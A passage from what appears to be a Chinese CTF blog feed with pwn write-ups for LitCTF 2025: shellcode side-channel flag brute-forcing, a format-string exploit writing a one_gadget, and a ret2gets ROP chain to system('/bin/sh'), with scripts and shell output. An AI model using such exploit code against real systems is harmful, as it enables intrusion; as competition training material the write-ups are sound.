class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6_2.35-0ubuntu3.10_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;node6.anna.nssctf.cn&quot;</span></span><br><span class="line">port = <span class="number">25114</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">i, c</span>):</span><br><span class="line">        <span class="keyword">global</span> io</span><br><span class="line">        io = start()</span><br><span class="line">        shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rax, 0</span></span><br><span class="line"><span class="string">        movabs rax, 0x67616C66</span></span><br><span class="line"><span class="string">        push 0</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        push rsp</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rsi, rdi</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        mov rdx, 0x100</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov al, [rsp+&#123;&#125;]</span></span><br><span class="line"><span class="string">        cmp al, &#123;&#125;</span></span><br><span class="line"><span class="string">        jbe $</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;shellcode: \n&#x27;</span>)</span><br><span class="line">        io.send(shellcode)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        l = <span class="number">0x20</span></span><br><span class="line">        r = <span class="number">0x80</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">                m = (l + r) // <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> find(i, m):</span><br><span class="line">                        r = m - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        l = m + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> l==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(l)</span><br><span class="line">        flag += <span class="built_in">chr</span>(l)</span><br><span class="line">        log.success(<span class="string">&quot;right, flag now is --&gt; &quot;</span>+flag)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;final flag --&gt; &quot;</span>+flag)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>爆破几分钟后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Sent 0x3f bytes:</span><br><span class="line">    00000000  48 c7 c0 00  00 00 00 48  b8 66 6c 61  67 00 00 00  │H···│···H│·fla│g···│</span><br><span class="line">    00000010  00 6a 00 50  54 5f 48 31  f6 48 31 d2  48 c7 c0 02  │·j·P│T_H1│·H1·│H···│</span><br><span class="line">    00000020  00 00 00 0f  05 48 89 fe  48 89 c7 48  31 c0 48 c7  │····│·H··│H··H│1·H·│</span><br><span class="line">    00000030  c2 00 01 00  00 0f 05 8a  44 24 2c 3c  20 76 fe     │····│····│D$,&lt;│ v·│</span><br><span class="line">    0000003f</span><br><span class="line">[*] Closed connection to node6.anna.nssctf.cn port 25114</span><br><span class="line">32</span><br><span class="line">[+] right, flag now is --&gt; NSSCTF&#123;3e8b3993-0c36-4a66-8e52-5104b9d9f808&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-onlyone"><a href="#0x03-onlyone" class="headerlink" title="0x03 onlyone"></a>0x03 onlyone</h2><p>题目源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+7h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome Lictf 2025&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift 1 is %p\n&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift 2 is %p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给了栈地址和<code>libc</code>地址，非栈上格串，在<code>printf</code>的返回地址后一个单元部署<code>one_gadget</code>，最后修改<code>printf</code>的返回地址为<code>ret</code>即可<br>见另一篇<a href="https://r3t2.top/2025/09/08/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E5%87%BA%E5%8F%91%E7%9A%84%E5%85%B3%E4%BA%8Eprintf%E4%B8%AD%E5%A4%84%E7%90%86fmtstr%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">博客</a><br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/libc6_2.31-0ubuntu9.17_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;node1.anna.nssctf.cn&quot;</span></span><br><span class="line">port = <span class="number">28326</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/libc6-dbg_2.31-0ubuntu9.17_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/glibc-source_2.31-0ubuntu9.17_all/usr/src/glibc/glibc-2.31</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn :)</span></span><br><span class="line"><span class="comment"># printf_ret = leak_stack_addr - 0xf p1 --&gt; 11$ p2 --&gt; 39$ p1&#x27; --&gt; 27$ p2&#x27; --&gt; 41$</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">printf_ret = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0xf</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base --&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;printf_ret --&gt; &quot;</span>+<span class="built_in">hex</span>(printf_ret))</span><br><span class="line"></span><br><span class="line">printf_ret = printf_ret &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span> + <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(printf_ret - <span class="number">0x5c</span>).encode() + <span class="string">b&quot;%hn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x10000</span> - printf_ret + <span class="number">0xba</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x201060</span></span><br><span class="line">log.info(<span class="string">&quot;elf_base --&gt; &quot;</span>+<span class="built_in">hex</span>(elf_base))</span><br><span class="line">ret = elf_base + <span class="number">0x954</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="comment">#constraints:</span></span><br><span class="line"><span class="comment">#  [r15] == NULL || r15 == NULL || r15 is a valid argv</span></span><br><span class="line"><span class="comment">#  [r12] == NULL || r12 == NULL || r12 is a valid envp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="comment">#constraints:</span></span><br><span class="line"><span class="comment">#  [r15] == NULL || r15 == NULL || r15 is a valid argv</span></span><br><span class="line"><span class="comment">#  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="comment">#constraints:</span></span><br><span class="line"><span class="comment">#  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span></span><br><span class="line"><span class="comment">#  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xe3b01</span></span><br><span class="line">target = printf_ret + <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># put ogg to stack</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xba</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(target - <span class="number">0xba</span>).encode() + <span class="string">b&quot;%27$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xba</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>((one_gadget &amp; <span class="number">0xffff</span>) - <span class="number">0xba</span>).encode() + <span class="string">b&quot;%41$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xba</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(target + <span class="number">2</span> - <span class="number">0xba</span>).encode() + <span class="string">b&quot;%27$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xba</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - <span class="number">0xba</span>).encode() + <span class="string">b&quot;%41$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xba</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(target + <span class="number">4</span> - <span class="number">0xba</span>).encode() + <span class="string">b&quot;%27$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xba</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(((one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) - <span class="number">0xba</span>).encode() + <span class="string">b&quot;%41$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(ret &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%39$hn&quot;</span> <span class="comment"># return to &#x27;ret&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>效果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                                       `$                  c                                                                                                                                                           ca                                                                                                                                                          cat                                                                                                                                                         cat                                                                                                                                                         cat f                                                                                                                                                       cat fl                                                                                                                                                      cat fla                                                                                                                                                     cat flag                                                                                                                                                    cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    b&#x27;cat flag\n&#x27;</span><br><span class="line">[DEBUG] Received 0x2d bytes:</span><br><span class="line">    b&#x27;NSSCTF&#123;472249c4-2a1e-41be-ac8f-5cbe8fb412e8&#125;\n&#x27;</span><br><span class="line">NSSCTF&#123;472249c4-2a1e-41be-ac8f-5cbe8fb412e8&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h2 id="0x04-master-of-rop"><a href="#0x04-master-of-rop" class="headerlink" title="0x04 master of rop"></a>0x04 master of rop</h2><p>题目源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to LitCTF2025!&quot;</span>);</span><br><span class="line">  gets(v4, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gets</code>函数…然而这里没有可用的<code>gadget</code>…<br><a href="https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets">参考文章</a>，套板子（针对<code>gets</code>的手法价值不大）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8/amd64/libc6_2.39-0ubuntu8_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;node6.anna.nssctf.cn&quot;</span></span><br><span class="line">port = <span class="number">20416</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8/amd64/libc6-dbg_2.39-0ubuntu8_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8/amd64/glibc-source_2.39-0ubuntu8_all/usr/src/glibc/glibc-2.39</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn :)</span></span><br><span class="line">gets_plt = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">call_gets = <span class="number">0x4011c8</span></span><br><span class="line">main = <span class="number">0x4011ad</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to LitCTF2025!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x404500</span>) + p64(gets_plt)*<span class="number">2</span> + p64(puts_plt) + p64(call_gets)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(p32(<span class="number">0</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x28c0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base --&gt; &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x10f75b</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(system))</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>libc</code>小版本有问题，懒得搞了，我去你的***</p><h2 id="0xff"><a href="#0xff" class="headerlink" title="0xff"></a>0xff</h2><p>时隔好几个月，回过头一看，过去的自己好菜啊…</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>御网杯2025</title>
      <link href="/2025/05/17/%E5%BE%A1%E7%BD%91%E6%9D%AF2025/"/>
      <url>/2025/05/17/%E5%BE%A1%E7%BD%91%E6%9D%AF2025/</url>
      
